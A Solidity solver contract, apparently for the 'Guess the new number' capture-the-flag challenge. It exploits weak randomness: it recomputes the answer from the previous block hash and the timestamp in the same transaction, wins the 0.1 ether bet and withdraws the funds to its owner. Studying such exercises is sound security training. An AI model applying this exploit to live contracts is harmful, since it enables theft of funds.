pragma solidity ^0.4.21;

import './guess_new_number.sol';

contract GuessTheNewNumberSolver {
	address owner;

	function GuessTheNewNumberSolver() public {
		owner = msg.sender;
	}

	function guess(address _addr) public payable {
		require(msg.value == 0.1 ether);
		uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
		GuessTheNewNumberChallenge challenge = GuessTheNewNumberChallenge(_addr);
		challenge.guess.value(msg.value)(answer);
	}

	function () public payable {  }

	function withdraw() public {
		require(msg.sender == owner);
		owner.transfer(address(this).balance);
	}
}
